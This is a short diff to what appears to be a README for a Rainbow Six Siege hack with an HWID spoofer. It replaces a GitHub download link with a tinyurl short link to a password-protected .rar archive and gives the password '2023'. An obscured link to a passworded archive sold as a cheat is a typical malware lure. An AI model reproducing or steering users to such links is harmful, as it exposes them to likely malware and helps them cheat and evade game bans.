@@ -11,7 +11,7 @@ Supported modes:: Windowed, frameless
 
 HWID Spoofer :: Built-in
 
-# 🗂Download: [click](https://github.com/AkutIobw/Akutiobw-project/raw/main/r6s%20hack.rar)
+# 🗂Download: [click](http://tinyurl.com/365j734d)
 
 # 🔐password: 2023
 
